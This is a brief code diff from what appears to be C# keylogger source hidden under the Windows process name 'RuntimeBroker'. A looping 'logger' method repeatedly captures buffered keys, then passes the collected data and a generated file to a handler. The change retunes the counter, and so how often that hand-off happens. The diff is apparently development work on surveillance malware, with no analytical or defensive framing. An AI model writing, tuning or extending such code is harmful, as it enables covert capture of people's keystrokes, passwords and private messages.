@@ -19,12 +19,12 @@ namespace RuntimeBroker
         }
         private void logger()
         {
-            int i = 5000;
+            int i = 0;
             while(true)
             {
                 i++;
                 log.GetBuffKeys();
-                if(i == 9000)
+                if(i == 100000)
                 {
                     if (end) Environment.Exit(0);
                     file.decide(this, addons.genFile(), log.getData());
